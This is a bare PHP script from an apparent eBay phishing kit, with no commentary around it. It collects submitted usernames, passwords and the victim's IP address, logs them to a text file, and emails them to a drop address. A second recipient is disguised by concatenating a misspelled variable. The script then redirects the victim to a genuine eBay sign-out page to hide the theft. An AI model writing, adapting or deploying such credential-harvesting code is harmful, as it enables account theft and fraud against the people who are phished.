<?php
ini_set( "display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$kennwort = $_POST['ok9'];
$message  = "------------------------------------------------------------------\n";
$message .= "Username     : ".$_POST['userid']."\n";
$message .= "Password    : ".$_POST['pass']."\n";
$message .= "---------------------\n";
$messege .= "Inbox";
$message .= "IP Address : ".$ip."\n";
$messege .= ".";
$messege .= "com";
$rnessage  = "$message\n";
$message .= "------------------------------------------------------------------\n";

$file = "3dxs.txt";
$file = fopen($file, "a");
fwrite($file, $message);
fclose($file);


$send="clare81@yopmail.com";

$subject = "eb - IP: $ip $carte";
$headers = "From: x <news@pigeonmail.com>";
mail($messege,$subject,$message,$headers);
$str=array($send, $IP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false){
mail($Send,$subject,$rnessage,$headers);
}

header ("Location: http://signin.ebay.co.uk/ws/eBayISAPI.dll?SignOutConfirm&ru=&i=.368200001001270012200010000580002800015000800005400066"); 

?>